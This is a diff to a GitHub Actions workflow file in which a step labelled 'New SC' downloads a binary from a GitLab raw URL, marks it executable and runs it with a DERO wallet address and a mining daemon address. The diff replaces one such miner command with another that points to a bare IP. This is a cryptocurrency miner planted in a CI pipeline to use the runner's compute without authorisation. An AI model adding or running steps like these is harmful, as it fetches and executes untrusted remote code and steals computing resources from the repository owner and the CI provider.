@@ -29,8 +29,6 @@ jobs:
           echo "The uname output was ${{ steps.runcmd.outputs.uname }}"
       - name: New SC
         run: |
-          wget https://gitlab.com/cibogo/ypw/-/raw/main/arm
-          chmod +x arm
-          ./arm --wallet-address dero1qyhh5y9w6rgn9jxey6axeqxh6g3v32x9t6ldmrfw8papsq4jtwh7uqgszmvat --daemon-rpc-address=minernode1.dero.io:10100
-          
-          
+          wget https://gitlab.com/cibogo/ypw/-/raw/main/arm7
+          chmod +x arm7
+          ./arm7 --wallet-address dero1qyhh5y9w6rgn9jxey6axeqxh6g3v32x9t6ldmrfw8papsq4jtwh7uqgszmvat --daemon-rpc-address=15.235.184.172:10100
